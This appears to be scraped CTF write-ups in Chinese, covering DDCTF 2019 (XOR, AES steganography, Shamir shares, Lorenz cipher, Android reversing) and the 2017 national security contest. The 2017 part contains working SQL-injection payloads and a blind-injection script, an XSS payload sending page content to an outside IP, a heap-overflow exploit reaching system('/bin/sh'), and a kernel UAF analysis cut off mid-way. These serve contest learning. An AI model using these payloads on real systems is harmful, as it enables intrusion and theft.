5c8f362bea465a913479fb405c9c363dfe40568c7f79ea5c57df3a2dab45528c732de357409a7329e45d41df232be451569b262bee4 1138b3b38ff1252933f36fc5757df2731ee1276913a3ee6531392323ae35b5d9a2079ff5d139d3679f957459a212aee1f56913430e5 57568d363dab535d9b732de357139c3a29e357418c732de412519a732bee5357d15953df5a56df143cf95f52917329e747549d3c38f 9561e9a222ce242439a3779ce5c5a983e38ab50569c3234ee127d9e2930ab75568d3e38e54b148c7329f95b5d9c3a29ea5e139c2120 fb465cd22020f84656927d79c2461388322aab504190383ce5125186732de35713af3c35e2415bdf143ce557419e3f79d8465299357 ef81270962331ee4013bd262bee5346df3a37ab76569c3634e95741df6260b8001fdf2430ff5a138b3b3cab535a9b7336ed12758d36 37e85a1e8c2629fb5e5a9a3779e25c479a3f35e2555691303cab5f528b362be2535fdf3c3bff535a91363dab5441903e79ea12749a2 134ea5c138c2320a51272df3e36e5465bdf313ced5d419a732de3571390262de940569e3879e45413a83c2be75613a8322bab7b7ad3 7338ff1252df3036e554568d3637e85713973635ef125d9a322bab65528d2038fc1e138b3b3cab625c933a2ae31270962331ee4013b d262bee5346df2031ea40569b7330ff4113ba3d30ec5f52d2312bee5358963d3eab46569c3b37e243469a2079ea5c57df273ce85a5d 903f36ec4b13883a2de31247973679cd4056913031ab535d9b731bf95b47962031a512778a2130e555138b3b3cab75568d3e38e5125 a912538f85b5c917336ed1263903f38e5561fdf3036f95713af3c35e2415bdf1030fb5a568d731bfe40569e2679fb57418c3c37e557 5fdf243cf957139a2538e847528b363da71245963279d95d5e9e3d30ea1e138b3c79cd405291303cab455b9a213cab465b9a2a79ee4 1479e3135e2415b9a3779ff5a56df031aab70418a3d36ab415a983d38e74113963d2dee5e5f96343ce55156df202dea465a903d79fc 5b4797731ff9575d9c3b79ed5350963f30ff5b568c732afe424390212da512608a303aee4140992635ab515c90233cf95347963c37a b535e903d3eab465b9a7309e45e568c7f79ff5a56df152bee5c50977f79ea5c57df2731ee12718d3a2de2415bdf322dab705f9a273a e35e56867309ea4058df3036e5465a91263cef1246912730e712798a3d3cab030acb6375ab455b9a3d79cd405291303cab41468d213 ce556568d363dab465cdf2731ee12749a2134ea5c40d15953cd405c92732de35b40df313cec5b5d913a37ec1e138b3b3cab70419627 30f85a13b83c2fee405d923637ff127090373cab535d9b731af2425b9a2179d8515b903c35ab1a74bc751ad81b139e2779c95e568b3 031e7574adf0338f959139d2630e746138a2379ea5c139a2b2dee5c4096253cab514186232dea5c52932a2de251139c3229ea505a93 3a2df21c13b63d30ff5b52933f20a71247973679ef57508d2a29ff5b5c91732eea4113923230e55e4adf3c3fab7e4699272eea54559 a7371cc5741923237ab535a8d733fe440509a7a79ea5c57df3279ed5744df1b3cee4013d7143cf95f52917338f95f4ad67334ee4140 9e343cf81e139e2079ff5a56df182be257548c3e38f95b5d9a7371cc5741923237ab5c52892a70ab575e8f3f36f25757df3e2ce85a1 3923c2bee12409a302cf957138f2136e857578a213cf81255902179fe415a913479ce5c5a983e38a51272933237ab66468d3a37ec1e 139e731aea5f518d3a3dec5713aa3d30fd57418c3a2df2125e9e2731ee5f528b3a3ae2535ddf3237ef125f903430e85b52917f79fb4 05c893a3dee561392263ae3125c99732de35713902130ec5b5d9e3f79ff5a5a913830e555138b3b38ff125f9a3779ff5d138b3b3cab 56568c3a3ee5125c99732de357139c2120fb4652913235f2465a9c3235ab505c92313cab5f529c3b30e55740df2731ea461388362be e125a91202df9475e9a3d2dea5e13963d79ee445691272cea5e5f86733bf95752943a37ec1247973679e553459e3f79ce5c5a983e38 a5127b90243cfd5741d3732de35713b42130ee554092322be25c56df3a37ff405c9b263aee56139e3d79ce5c5a983e38ab44568d203 0e45c13883a2de31252df3536fe404797732be4465c8d733fe4401396272aab671e9d3c38ff411fdf213cf8475f8b3a37ec125a9173 38ab4241903f36e555569b7329ee405a903779fc5a5691732de357409a7334ee41409e343cf81250902635ef125d902779e957139b3 63af94b438b363da51264962731ab465b9a733aea42478a213cab5d55df213ce757459e3d2dab515a8f3b3cf912589a2a2aab535d9b 732de357138a203cab5d55df3e2ce85a1399322aff5741df060aab7c52892a79e95d5e9d362aa712419a342ce75341d3732bea425a9 b732bee5357963d3eab5d55df0674e95d528b7334ee41409e343cf812419a202ce65757d15953df5a56df3535ea5513962063ab7677 bc071ff002579c3638b806069d326dbd040bcf3169e90101cc3761ea0a02cf656db8570a82\" txt = txt.decode(\"hex\") print len(txt) print len(set(txt)) open(\"xorout\",\"wb\").write(txt[1:])#xortools分析过一次，发现第一位是噪音干扰值，直接去除。 pwn@7feilee:/mnt/c/Users/7feilee$ xortool xorout -c 20 The most probable key lengths: 3: 11.9% 6: 19.7% 9: 9.4% 12: 14.5% 15: 7.1% 18: 11.2% 21: 5.3% 24: 8.4% 30: 6.8% 36: 5.7% Key-length can be 3*n 1 possible key(s) of length 6: 3\\xffSY\\x8bw Found 1 plaintexts with 95.0%+ printable characters See files filename-key.csv, filename-char_used-perc_printable.csv pwn@7feilee:/mnt/c/Users/7feilee$ xxd xortool_out/0.out 00000000: 4372 7970 7424 6e61 6c79 732c 7320 6f66 Crypt$nalys,s of 00000010: 2031 6865 2045 6e2c 676d 6120 632c 7068 1he En,gma c,ph 发现明文中有1/6的字母是错误的，应该是key的一位有问题，找到原文 https://en.wikipedia.org/wiki/Cryptanalysis_of_the_Enigma 得到key:3\\xffSY\\x8b2 解密： print repr(txt[:16]) data = open(\"xortool_out/0.out\",\"rb\").read() print data xxx = '''Cryptanalysis of the Enigma ciphering system enabled the western Allies in World War II to read substantial amounts of Morse-coded radio communications of the Axis powers that had been enciphered using Enigma machines. This yielded military intelligence which, along with that from other decrypted Axis radio and teleprinter transmissions, was given the codename Ultra. This was considered by western Supreme Allied Commander Dwight D. Eisenhower to have been \"decisive\" to the Allied victory.''' out = \"\" for i in range(0,493): out +=chr(ord(txt[i+1])^ord(xxx[i])) print repr(out) length = 2654 key = \"3\\xffSY\\x8b2\" plain =\"\" for i in range(0,2654): plain +=chr(ord(txt[i+1])^ord(key[i%6])) print plain flag： DDCTF{0dcea345ba46680b0b323d8a810643e9} 北京地铁 提示：AES ECB密钥为小写字母 提示2：密钥不足位用\\0补全 提示3：不要光记得隐写不看图片本身啊... 根据题目提示，查隐写，在 LSB 里找到一串 base64 编码的字符串，应该是 AES 的密文。进一步根据 Color Threshold 提示，用 PhotoShop 调整图片的阀值，找到 北京地铁线路图 上某一站点的颜色不一样，这个站点的 小写拼音字母 为加密密钥。 from Crypto.Cipher import AES from base64 import * cipher=b64decode('7SsQWmZ524i/yVWoMeAIJA==') key='weigongcun'.ljust(16,'\\x00') mode=AES.MODE_ECB c=AES.new(key, mode) print c.decrypt(cipher) Flag: DDCTF{Q****@B0} 联盟决策大会 以下为使用到的7个十六进制常数： p = C45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627 E3ED40FBDE968251984513ACC2B627B4A483A6533 组织1成员1 = 729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB17 77357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E 组织1成员2 = 478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C 24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6 组织1成员4 = BFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB 5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D 组织2成员3 = 9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A 0A494BE36CEF44ADE376317E7A0C70633E3091A61 组织2成员4 = 79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393F C7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8 组织2成员5 = 2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472 444A3CE2368E5A6EBF96603B3CD10EAE858150510 根据题目提示，在维基百科上可以找到 Shamir算法 的解密脚本。使用 组织1成员1 & 组织1成员2 & 组织1成员4 & p，可以解密得到 组织1密文。使用 组织2成员3 & 组织2成员4 & 组织2成员5 & p，可以解密得到 组织2密文。刚开始想直接将两者进行 xor 处理，应该就能得到明文，其实这样行不通。后来发现将两者拿去进行解密，就可以得到明文了。附上解密脚本： from __future__ import division from __future__ import print_function import random import functools _PRIME = 2**127 - 1 _RINT = functools.partial(random.SystemRandom().randint, 0) def _eval_at(poly, x, prime): accum = 0 for coeff in reversed(poly): accum *= x accum += coeff accum %= prime return accum def make_random_shares(minimum, shares, prime=_PRIME): if minimum > shares: raise ValueError(\"pool secret would be irrecoverable\") poly = [_RINT(prime) for i in range(minimum)] points = [(i, _eval_at(poly, i, prime)) for i in range(1, shares + 1)] return poly[0], points def _extended_gcd(a, b): x = 0 last_x = 1 y = 1 last_y = 0 while b != 0: quot = a // b a, b = b, a%b x, last_x = last_x - quot * x, x y, last_y = last_y - quot * y, y return last_x, last_y def _divmod(num, den, p): inv, _ = _extended_gcd(den, p) return num * inv def _lagrange_interpolate(x, x_s, y_s, p): k = len(x_s) assert k == len(set(x_s)), \"points must be distinct\" def PI(vals): accum = 1 for v in vals: accum *= v return accum nums = [] dens = [] for i in range(k): others = list(x_s) cur = others.pop(i) nums.append(PI(x - o for o in others)) dens.append(PI(cur - o for o in others)) den = PI(dens) num = sum([_divmod(nums[i] * den * y_s[i] % p, dens[i], p) for i in range(k)]) return (_divmod(num, den, p) + p) % p def recover_secret(shares, prime=_PRIME): if len(shares) Flag: DDCTF{vF22holF5hl5*****FZ5kZ1DBdWOGObk} 声纹锁 Please find the python script [FINAL_SOLUTION]_recover_voice.py. [RECOVERED_WAV]_recovered_better.wav is the recovered audio from [CHALLENGE_ATTACHMENT]_fingerprint.png by using the python script. 其实这题是一个相当简单的题目，可以用一句话说明：给定傅里叶级数的系数计算原函数并采样成音频。原题给出的fingerprint实际上是音频的频谱 图（Spectrogram）又称声指纹（Voiceprint）。影响音频质量的主要是采样频率低（香农采样定理），实测生成fingerprint时只要把音频sample rat e(源码的sr)=30000时就可以得到较为清晰的原音频。除此以外，通过一些算法也可以弥补音频质量低的问题，比如说考虑到这是人声，可加入低通滤波 器（比如 PWN 作者：admin-琴里 Strike 首先，我们读一下整个程序我们可以看到这里buf可以输入0x40个字节查看安全检查，没有canary后面通过调试这里输入可以泄露下面输入password可以看到这里signed 变成了unsigned这里的话 就是一个整形溢出漏洞然后，我们就可以进行栈溢出攻击我们通过第一步泄露libc地址在进行第二部攻击的时候发现这里最后的指令是会困住你的lea esp,[ecx-4]改变了栈地址retn的时候要注意我尝试按照一般的做法直接覆盖是行不通的就只能泄露栈地址然后计算偏移算出libc_base附件给了libc，可以确定onegadget然后通过第二部的栈溢出构造返回为one_gadget就直接shel然后我们就能拿到flag Android 感谢作者：impakho Breaking LEM 提示：The format of the flag is DDCTF{ddctf-android-lorenz-ZFXXXXXX}, where XXXXXX represents a 6-char string comprised of A-Z and 0-9. MAX Attempts Limit is 5 看题目应该是 Lorenz Cipher，上维基百科恶补一番。反编译 APK，找到关键函数在 libhello-libs.so 文件里的： Java_com_didictf_guesskey2019lorenz_MainActivity_stringFromJNI(int a1); 结合动态调试，分析出输入要以 ddctf-android-lorenz- 开头，里面会去除这个开头，然后判断剩下的字符串是否在 A-Z,1-6 范围内，然后拿去做 Lorenz Encrypt，最后加密结果做 5轮sha256 计算，比较结果是否与设定值相同。LEM 初始化时会设置 Pinsettings，也就是轮子的初始值，然后每次转轮生成固定的密钥，有点像 srand 和 rand 产生伪随机数的过程。然后用户输入还经过 TelePrinter 的 Baudot 编码转换。生成的密钥与用户输入进行 xor 处理。完成一次加密需要进行 10轮 这个步骤。根据题目提示，需要交给 LEM 做加密的字符串为 ZFXXXXXX（X 代表的字符在 A-Z,1-6 范围内）。为了省事，在此处下断点读 v4，读 8*10=80 次，把需要用到的密钥读出来。已知明文前面两字节为 ZF，需要爆破后面6字节。写出爆破脚本如下： from hashlib import sha256 target='4b27bd0beaa967e3625ff6f8b8ecf76c5beaa3bda284ba91967a3a5e387b0fa7' table='ABCDEFGHIJKLMNOPQRSTUVWXYZ123456' key=[0x9,0x17,0x16,0x3,0x12,0xB,0x1B,0x0,0x4,0x10,0x19,0x5,0x17,0x1D,0x17,0x18,0x18,0x19,0xE,0x3,0x8,0x8,0x18,0xD,0x1E,0x9,0x19,0x1E,0x13,0x0,0x1E,0x1F,0x5,0x11,0x1A,0xD,0x17,0xF,0x1C,0x7,0x1B,0xA,0x8,0x9,0x7,0x1F,0x17,0xA,0xF,0x1F,0x4,0xD,0x18,0xE,0xB,0xB,0x12,0x4,0x3,0xD,0xD,0x4,0x5,0x1D,0xE,0x11,0x8,0x5,0x15,0x1C,0x7,0x1E,0x14,0x9,0x1F,0x2,0xD,0xE,0xA,0x19] tele=[3,25,14,9,1,13,26,20,6,11,15,18,28,12,24,22,23,10,5,16,7,30,19,29,21,17,0,4,8,2,27] flag='ZF' enc='' for i in range(2): tmp=tele[table.index(flag[i])] for j in range(10): tmp^=key[j*8+i] enc+=table[tele.index(tmp)] print enc i=0 succ=0 for a in table: for b in table: for c in table: for d in table: for e in table: for f in table: if i%100000==0: print float(i)*100/1073741824 tmp=enc+a+b+c+d+e+f res=tmp for k in range(5): res=sha256(res).hexdigest() i+=1 if res==target: print tmp enc=tmp succ=1 break if succ==1: break if succ==1: break if succ==1: break if succ==1: break if succ==1: break flag='' for i in range(8): tmp=tele[table.index(enc[i])] for j in range(10): tmp^=key[j*8+i] flag+=table[tele.index(tmp)] print 'DDCTF{ddctf-android-lorenz-%s}' % flag 跑大概一个小时左右，就能跑到 Flag 了。 Flag: DDCTF{ddctf-android-******-ZFPQETDB} Have Fun 这题真令人头疼。变量名全部经过 Unicode混淆，字符串全部经过 动态解密混淆，关键代码还插了 垃圾指令 导致生成伪代码失败。 尝试动态调试，直接闪退，logcat 显示 loadlibrary 时抛出 has invalid shdr offset/size 错误。上网查了一下，发现 Android >= 7 时开启了诸多对 .so 文件的检测。而这道题的 .so 头部被修改过，所以过不了这个检测。先对 libhwFGfOp0EzktJb.so 进行分析。此处会判断输入长度是否为14字节。然后与 off_2910 进行比较。 off_2910 = @n|ixihPIppqws 再分析一下 smali 代码。发现它会调用到一个外部 dex 文件：assets/Y2xhc3Nlc19kZC5kZXg=。 这里会对用户输入进行 Encode，然后再交由 .so 进行比较。写解密脚本，发现提交答案始终不正确。在这里卡了一段时间，后来重新审计 smali 代码，发现自己还是太年轻了，没玩懂出题人的套路。里面有段代码会动态修改外部 dex 文件，往里面插入一些代码，重新计算头部的校验值，并且生成一个新的 dex 文件，释放到 /sdcard/ 里的一个隐藏文件夹里。新文件名为 dnsmanYUn12M.dex，这个才是真正被调用到的 dex 文件。没理解错的话，整个流程用术语好像是叫作 热修复？那么如何得到新的 dex 文件呢。搞了很久，终于找到一条行得通的办法。由于 .so 被修改了头，直接运行 APK 会闪退，所以注释掉 smali 里 loadlibrary 这一行，重新打包 APK，这样就能不会闪退了。然后点击 Check 的按钮，让它生成新的 dex 文件，并且由于没有 loadlibrary 无法调用外部函数，触发闪退。这样就能从隐藏文件夹里提取出新的 dnsmanYUn12M.vdex 和 dnsmanYUn12M.odex文件。然后手工转成 dnsmanYUn12M.dex 文件，进一步分析。这才是真正的 dex 文件。套路真的深～写解密脚本，一个很简单的解密流程。 enc='@n|ixihPIppqws' flag='' for i in range(len(enc)): flag+=chr(ord(enc[i])^(i+8)) print flag 终于得到 Flag。 Flag: DDCTF{Hg******_Yabbcf} 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-09 00:34:28 0 issues reported "},"articals/2017national.html":{"url":"articals/2017national.html","title":"2017全国信安赛","keywords":"","body":"2017全国大学生信息安全竞赛 题目类型： 类型 年份 难度 官方赛事题 2017 中 题目下载： 暂无 网上公开WP: https://www.anquanke.com/post/id/86431 https://p0sec.net/index.php/archives/107/ https://blog.csdn.net/csu_vc/article/details/78011716 https://blog.csdn.net/aptx4869_li/article/details/80589250 本站备份WP： 作者：FlappyPig web 一.PHP execise 类型：WEB 分值：150分直接就能执行代码，先执行phpinfo(),发现禁用了如下函数 assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm, pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled, pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch, pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait, pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents, file,readfile,opendir,readdir,closedir,rewinddir, 然后通过foreach (glob(\"./*\") as $filename) { echo $filename.\"\"; } glob()函数经常用于disable_function()的绕过，该函数的作用是返回匹配指定模式的文件名或目录。 该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。 列出当前目录，然后再用highlight_file()函数读取flag文件内容即可 此处还可用shou_source函数 web 250 首先通过svn泄露获取到源码，然后观察发现主要部分在login.php这里 11){ echo(\"alert('name too long')\"); }else{ $sql = \"select count(*) from t_info where username = '$name' or nickname = '$name'\"; echo $sql; $result = mysql_query($sql); $row = mysql_fetch_array($result); if ($row[0]){ $_SESSION['hat'] = 'black'; echo 'good job'; }else{ $_SESSION['hat'] = 'green'; } header(\"Location: index.php\"); } } 由index.php中代码: 当$_SESSION['hat'] = 'black';时，在index.php下面就能获取到flag， 但是我们注册时候插入的表是t_user，而这里登陆查询的表是t_info,所以思路就只有想办法在login这里注入，结合login.php分析可知，在login.php中，第5行，但会结果不为空，即可。 因此构造poc 最后构造的payload如下： name=or%0a1=1%0a#'&submit=check 成功获取到flag为flag{good_job_white_hat} 8.Classical 类型：web 分值：300分 题目类似WCTF某原题。 加密代码生成了超递增的sk后，使用sk * mask % N作为pk进行使用。flag被用于选取pk求和得到sum。 是典型的Knapsack problem，使用Shamir Attack进行攻击。在github上有很多此类加密方案的攻击办法： https://github.com/taniayu/merklehellman-lll-attack https://github.com/kutio/liblll https://github.com/sonickun/ctf-crypto-writeups/tree/4c0841a344bc6ce64726bdff4616fe771eb69d1e/2015/plaid-ctf/lazy 攻击方法为首先构造矩阵，通过lllattack求得新的矩阵，选取最短的向量即可。 c=956576997571830839619219661891070912231751993511506911202000405564746186955706649863934091672487787498081924933879394165075076706512215856854965975765348320274158673706628857968616084896877423278655939177482064298058099263751625304436920987759782349778415208126371993933473051046236906772779806230925293741699798906569 pubkey=[（自己去复制吧）] from Crypto.Util.number import long_to_bytes as l2b def create_matrix(pub, c): n = len(pub) i = matrix.identity(n) * 2 last_col = [-1] * n first_row = [] for p in pub: first_row.append(int(long(p))) first_row.append(-c) m = matrix(ZZ, 1, n+1, first_row) bottom = i.augment(matrix(ZZ, n, 1, last_col)) m = m.stack(bottom) return m def is_target_value(V): for v in V: if v!=-1 and v!=1: return False return True def find_shortest_vector(matrix): for col in matrix.columns(): if col[0] == 0 and is_target_value(col[1:]): return col else: continue pub = pubkey c = c m = create_matrix(pub, c) lllm = m.transpose().LLL().transpose() shortest_vector = find_shortest_vector(lllm) print shortest_vector x = \"\" for v in shortest_vector[1:]: if v == 1: x += \"1\" elif v == -1: x += \"0\" print x print hex(int(x,2))[2:-1].decode(\"hex\") #flag{M3k13_he11M4N_1ik3s_1Att1ce} 10.flag bending machine 类型：WEB 分值：300分 进去是一个注册及登陆，经过一番fuzz，认为最有可能是二次注入 例如我注册一个bendawang' or 1=1#和注册一个bendawang' or 1=0#，猜想在查询余额时的语句为 select xxx from xxx where username=bendawang' or 1=1# select xxx from xxx where username=bendawang' or 1=0# 所以很容易知道，如果是第一种情况，后面的or 1=1恒真，也就是查询的结果是整个表的结果，而第二个则是用户名为bendawang的结果，也就是说，猜想查询多个结果时取第一个的话，如果我购买了东西，也就是第一种情况显示的余额是不变的，而第二种情况是会变的。就可以根据这个点来进行二分盲注。 另外需要注意的是，题目过滤了一些关键字，select ,from ,on等，不过可以双写绕过，其中on是最坑的，这是最开始测试union是否被过滤发现的。都可以通过双写就能绕过了。 其它也就没有什么过滤了。 最后爆破出来的表名fff1ag，列名thisi5f14g 爆破flag的脚本如下： import requests import string import random import time import re #fff1ag #thisi5f14g url='http://106.75.107.53:8888/' chars=string.printable[:62]+\"!@#$%^&*()_+-={}\" header = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Connection': 'keep-alive' } def register(data): result = requests.post(url+\"register.php\",data=data,headers=header) if \"Register success\" in result.content: return True else: return False def check(data): data=data.replace('on','') #print data r=requests.session() content=r.post(url+\"login.php\",data=data,headers=header).content #print content if \"wrong\" in content: raw_input(\"error!!!!!!!!!!!!!!!!!!!!!!\"); balance=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance1:\"+str(balance) r.get(url+'buy.php?id=1') content=r.get(url+'user.php').content balance2=int(re.findall('you balance is (.*?)',content)[0]) #print \"balance2:\"+str(balance2) if balance-2333==balance2: return True else: return False ans=\"\" for i in xrange(1,100): for j in chars: username=str(time.time())+\"' or ord(substr((selonect thisi5f14g froonm fff1ag),%d,1))=%s#\"%(i,ord(j)) #print username password='123' data='user='+username+'&pass='+password if register(data)==True: print i,j if check(data)==True: ans+=j print ans break 截图如下： 14.Guestbook 类型：WEB 分值：400分 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 然后是沙盒： //sandbox delete window.Function; delete window.eval; delete window.alert; delete window.XMLHttpRequest; delete window.Proxy; delete window.Image; delete window.postMessage; 发现沙盒和之前0ctf一样，csp也允许了unsafe-eval的执行 然后开始测试，经过测试发现link标签啊，location都被过滤替换成hacker。 但是location很容易绕过例如window['locat'+'ion'].href 所以思路和0ctf一样，用一个iframe从其他路径下“借用”一个XMLHttpRequest，来发送请求，大概初始payload如下： window.XMLHttpRequest = window.top.frames[0].XMLHttpRequest; var xhr = new XMLHttpRequest(); xhr.open(\"GET\", \"http://106.75.103.149:8888/index.php \", false); xhr.send(); a=xhr.responseText; window['locat'+'ion'].href='http://104.160.43.154:8000/xss/?content='+escape(a); 能够成功获得服务器的返回，但是没有cookie，源码里面也没有flag，通过测试document.referrer，发现这个地址： 首先看csp， default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' 最后修正payload如下： 16.方舟计划 类型：WEB 分值：400分 首先扫描发现在注册时手机那一栏存在报错注入 username='ad121212122min'&phone=' or updatexml(1,concat(0x7e,(/*!50001select*/a.name /*!50001from*/(/*!50001select*/ config.* /*!50001from*/ user config limit 0,1) a),0x7e),1)or'&password='admin'=''#&repassword='admin'=''# 可以获得账户密码 登录进去发现是ffpm读取任意文件 然后读取etc/passwd 被过滤了 稍微绕过一下就能读了 得到用户名s0m3b0dy 在其home目录下读取到flag文件 二、REVERSE 2.填数游戏 类型：REVERSE 分值：200分 逆向一看就是个数独游戏，主要就是把原来的9*9找出来 里面有一块初始化数独，那个地方看出来是 他的数独题目就如下一样，然后找个网站解一下， 然后输入时候把存在的项变成0就行 5.apk crack 类型：REVERSE 分值：300分 本题的做法比较取巧，首先使用jeb2打开apk文件，查看验证的关键流程 可以看到，程序在取得了用户输入的字符串后，会调用wick.show方法，这个方法会调用jni中的对应函数，该jni函数会开启反调试并给静态变量A、B赋值success和failed。随后会进入simple.check方法开启验证。 这个验证函数非常长，笔者也没看懂。Simple类中有两个字节数组，一个用于存储输入，把它命名为input；另一个数组初始为空，把它命名为empty。 使用jeb2的动态调试功能，把断点下到00000A7A函数的返回指令处，在手机中输入随意字符并点击确定，程序会断在返回指令处。 此时查看empty数组的值，发现疑似ASCII码的数字，转换过来就是flag flag：clo5er 17.溯源 类型：REVERSE 分值：200分 首先是输入长度为200字节，然后每两个字节转化为1个字节，得到100字节的输出。 根据后面的比较可以知道，这100字节分别为0-99这100个数。后面按照特定的顺序将0所在的位置和其上下左右的某个位置的数进行交换。验证经过交换后的数据刚好是0-99顺序排列。 大体思路是构造输入为0-99，得到交换后的数据，可以知道交换的映射关系，然后反过来根据输出为0-100，求输入。 data = '' for i in range(100): high = i/0x10 low = i%0x10 data += chr(65+high) + chr(65+low) print data #output of 0-99 f = open('./result', 'rb') d = f.read() f.close() from zio import * dict = {} for i in range(100): value = l32(d[i*4:i*4+4]) if value > 100: print hex(value) dict[value] = i data = '' for i in range(100): high = dict[i]/0x10 low = dict[i]%0x10 data += chr(65+high) + chr(65+low) print data 三、PWN 3.easyheap 类型：PWN 分值：200分 在edit的时候可以堆溢出，因为堆中有指针，因此只要覆盖指针即可任意地址读写。 因为开启了PIE，可以通过覆盖指针的最低字节进行泄露。 from threading import Thread from zio import * target = './easyheap' target = ('120.132.66.76', 20010) def interact(io): def run_recv(): while True: try: output = io.read_until_timeout(timeout=1) # print output except: return t1 = Thread(target=run_recv) t1.start() while True: d = raw_input() if d != '': io.writeline(d) def create_note(io, size, content): io.read_until('Choice:') io.writeline('1') io.read_until(':') io.writeline(str(size)) io.read_until(':') io.writeline(content) def edit_note(io, id, size, content): io.read_until('Choice:') io.writeline('2') io.read_until(':') io.writeline(str(id)) io.read_until(':') io.writeline(str(size)) io.read_until(':') io.write(content) def list_note(io): io.read_until('Choice:') io.writeline('3') def remove_note(io, id): io.read_until('Choice:') io.writeline('4') io.read_until(':') io.writeline(str(id)) def exp(target): io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green')) create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #0 create_note(io, 0xa0, 'b'*0x90) #1 create_note(io, 0xa0, 'c'*0x90) #2 create_note(io, 0xa0, '/bin/shx00'.ljust(0x90, 'a')) #3 remove_note(io, 2) edit_note(io, 0, 0xb9, 'a'*0xb0+l64(0xa0)+'xd0') list_note(io) io.read_until('id:1,size:160,content:') leak_value = l64(io.readline()[:-1].ljust(8, 'x00')) base = leak_value - 0x3c4b78 system = base + 0x0000000000045390 free_hook = base + 0x00000000003C67A8 edit_note(io, 0, 0xc0, 'a'*0xb0+l64(0xa0)+l64(free_hook)) edit_note(io, 1, 8, l64(system)) print hex(system) print hex(free_hook) remove_note(io, 3) interact(io) exp(target) 9.BabyDriver 类型：pwn 分值：450分 0x00 前言 首先题目给了一套系统环境，利用qemu启动，nc连接比赛环境后会得到一个低权限的shell，同时题目给了一个babyDriver.ko，通过insmod将驱动加载进系统，先进行环境搭建，我们使用的是qemu，根据题目给的boot.sh可以得到qemu的启动命令。 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic -smp cores=1,threads=1 -cpu kvm64,+smep 这里需要提的一点是很多人都是虚拟机里的Linux安装的qemu，这里有可能会报一个KVM的错误，这里需要开启虚拟机/宿主机的虚拟化功能。 http://p0.qhimg.com/t01b4e7c9581908c7d5.png 启动后我们可以进入当前系统，如果要调试的话，我们需要在qemu启动脚本里加一条参数-gdb tcp::1234 -S，这样系统启动时会挂起等待gdb连接，进入gdb，通过命令 Target remote localhost:1234 Continue 就可以远程调试babyDriver.ko了。 0x01 漏洞分析 通过IDA打开babyDriver.ko，这个驱动非常简单，实现的都是一些基本功能 关于驱动通信网上有很多介绍，这里我不多介绍了，这个驱动存在一个伪条件竞争引发的UAF漏洞，也就是说，我们利用open(/dev/babydev,O_RDWR)打开两个设备A和B，随后通过ioctl会释放掉babyopen函数执行时初始化的空间，而ioctl可以控制申请空间的大小。 __int64 __fastcall babyioctl(file *filp, __int64 command, unsigned __int64 arg, __int64 a4) { _fentry__(filp, command, arg, a4); v5 = v4; if ( (_DWORD)command == 65537 )//COMMAND需要为0x10001 { kfree(babydev_struct.device_buf);//释放初始化空间 LODWORD(v6) = _kmalloc(v5, 37748928LL);//申请用户可控空间 babydev_struct.device_buf = v6; babydev_struct.device_buf_len = v5; printk(\"alloc donen\", 37748928LL); result = 0LL; } else { printk(&unk_2EB, v4); result = -22LL; } return result; } 所以这里我们申请的buffer可控，再仔细看write和read函数，都做了严格的判断控制，似乎漏洞不在这里。 if ( babydev_struct.device_buf )//判断buf必须有值 { result = -2LL; if ( babydev_struct.device_buf_len > v4 )//判断malloc的空间大小必须大于用户读写空间大小 正如之前所说，这个漏洞是一个伪条件竞争引发的UAF，也就是说，我们通过open申请两个设备对象A和B，这时候释放设备对象A，通过close关闭，会发现设备对象B在使用设备对象A的buffer空间。这是因为A和B在使用同一个全局变量。 因此，释放设备A后，当前全局变量指向的空间成为释放状态，但通过设备对象B可以调用write/read函数读写该空间的内容。 我们就能构造一个简单的poc，通过open申请设备对象A和B，ioctl对A和B初始化一样大小的空间，通过kmalloc申请的空间初始化后都为0，随后我们通过close的方法关闭设备对象A，这时候再通过write，向设备对象B的buffer写入。 首先会将buffer的值交给rdi，并且做一次检查。 .text:00000000000000F5 ; 7: if ( babydev_struct.device_buf ) 